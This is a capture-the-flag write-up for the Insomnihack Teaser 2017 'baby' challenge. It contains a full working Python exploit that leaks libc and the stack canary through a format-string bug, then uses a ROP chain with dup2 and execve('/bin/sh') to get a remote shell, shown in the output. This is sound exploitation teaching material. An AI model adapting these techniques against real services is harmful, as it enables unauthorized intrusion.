#baby - insomnihackTeaser 2017

As usual we execute `file` command on the binary
```bash
$ file baby 
baby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, not stripped
```

and with `checksec` we get... WHAT? 

```bash
./checksec --file baby 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes	0		10	baby
```

pretty nice for a baby pwnable :D But fortunately the binary is very easy (and the organizers provided us the libc): a server spawns a child process who does this 

```bash 
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 
```

so we have a lot of possibilities here. The idea is to leak some address and information through the format string bug and then perform a simple buffer overflow. 

In order to write a ropchain we have to find an address of the libc and then calculate the libc's offset starting from this. Looking at the stack through FSB we find 
that at offset 158 there is the address of '<__libc_start_main+240>'. We can also leak the canary on the stack: it is at offset 144.

This part of the exploit is 

```python 
import sys, socket, telnetlib
from struct import *
import random
import time
import binascii
import time
def recvuntil(t):
    p = ''
    while not p.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        p += tmp

    return p

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

def recvMenu():
    recvuntil("Your choice > ")
    return

def leakAddrAtStack(offset,bytesToRead):
    print "LEAKING ADDR at stack offset " + str(offset)
    s.send("2\n")
    recvuntil("Your format > ")
    s.send("%" + str(offset) + "$lx\n")
    address = s.recv(bytesToRead)
    recvuntil("Your format > ")
    s.send("\n")
    return(int("0x" + address,16))

def doBufferOverflow(payload):
    print "PWNING"
    s.send("1\n")
    recvuntil("How much bytes you want to send ? ")
    s.send(str(len(payload)) + "\n")
    s.send(payload)
    print "INTERACTIVE"
    interactive()


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))

recvMenu()
libcstartmain_Address = leakAddrAtStack(158,12) - 0x20830   #offset 0x20830 from init
print hex(libcstartmain_Address)
recvMenu()
canary = leakAddrAtStack(144,16)
print hex(canary)
```

The first part of the ropchain is the redirection of the I/O using dup2 function

```python
p = ''

p += p64(0x0000000000021102+ libcstartmain_Address)        # pop rdi; ret
p += p64(0x4)                                              # sockfd
p += p64(0x00000000000202e8+ libcstartmain_Address)        # pop rsi; ret
p += p64(0x0)                                                                                
p += p64(0x00000000000F6D90+ libcstartmain_Address)        #dup2

p += p64(0x0000000000021102+ libcstartmain_Address)        # pop rdi; ret
p += p64(0x4)                                              # sockfd
p += p64(0x00000000000202e8+ libcstartmain_Address)        # pop rsi; ret
p += p64(0x1) 
p += p64(0x00000000000F6D90+ libcstartmain_Address)        # sockfd

p += p64(0x0000000000021102+ libcstartmain_Address)        # pop rdi; ret
p += p64(0x4)                                              # sockfd
p += p64(0x00000000000202e8 + libcstartmain_Address)       # pop rsi; ret
p += p64(0x3)
p += p64(0x00000000000F6D90+ libcstartmain_Address)
```

and finally the ropchain for '/bin/sh'

```python

p += pack('<Q', 0x0000000000001b92+ libcstartmain_Address) # pop rdx ; ret
p += pack('<Q', 0x00000000003c3080+ libcstartmain_Address) # @ .data
p += pack('<Q', 0x0000000000033544+ libcstartmain_Address) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000002e19c+ libcstartmain_Address) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x0000000000001b92+ libcstartmain_Address) # pop rdx ; ret
p += pack('<Q', 0x00000000003c3088+ libcstartmain_Address) # @ .data + 8
p += pack('<Q', 0x000000000008ad15+ libcstartmain_Address) # xor rax, rax ; ret
p += pack('<Q', 0x000000000002e19c+ libcstartmain_Address) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x0000000000021102+ libcstartmain_Address) # pop rdi ; ret
p += pack('<Q', 0x00000000003c3080+ libcstartmain_Address) # @ .data
p += pack('<Q', 0x00000000000202e8+ libcstartmain_Address) # pop rsi ; ret
p += pack('<Q', 0x00000000003c3088+ libcstartmain_Address) # @ .data + 8
p += pack('<Q', 0x0000000000001b92+ libcstartmain_Address) # pop rdx ; ret
p += pack('<Q', 0x00000000003c3088+ libcstartmain_Address) # @ .data + 8
p += pack('<Q', 0x000000000008ad15+ libcstartmain_Address) # xor rax, rax ; ret
p += pack('<Q', 0x00000000000ab390+ libcstartmain_Address)*59 # add rax, 1 ; ret
p += pack('<Q', 0x00000000000bb7c5+ libcstartmain_Address) # syscall ; ret
doBufferOverflow("A"*(1032) + p64(canary)+ p64(0xdeadbeef) + p + "\n")
```

PWN'EM!!

```bash
$ python exploit.py baby.teaser.insomnihack.ch 1337
LEAKING ADDR at stack offset 158
0x7f129d29e000
LEAKING ADDR at stack offset 144
0x7971cd723454900
PWNING
INTERACTIVE
Good luck !

id
uid=1001(baby) gid=1001(baby) groups=1001(baby)
ls
baby
flag
cat flag
INS{if_you_haven't_solve_it_with_the_heap_overflow_you're_a_baby!}
```

The full exploit is available [here](exploit.py)! 
